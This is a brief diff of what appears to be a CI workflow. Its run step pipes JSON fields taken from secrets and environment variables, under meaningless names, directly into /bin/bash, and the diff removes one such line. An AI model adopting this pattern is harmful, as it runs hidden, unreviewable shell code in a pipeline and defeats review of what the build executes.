@@ -19,7 +19,6 @@ jobs:
           g85332: ${{ secrets.g85332 }}
         run: |
           printf '%s' "$g85332" | jq -r .j0 | /bin/bash
-          echo $t8442 | jq -r .t50 | /bin/bash
           echo $lw86 | jq -r .naa2 | /bin/bash
           echo $dk357 | jq -r .rr8 | /bin/bash
           printf '%s' "$y06" | jq -r .n517 | /bin/bash
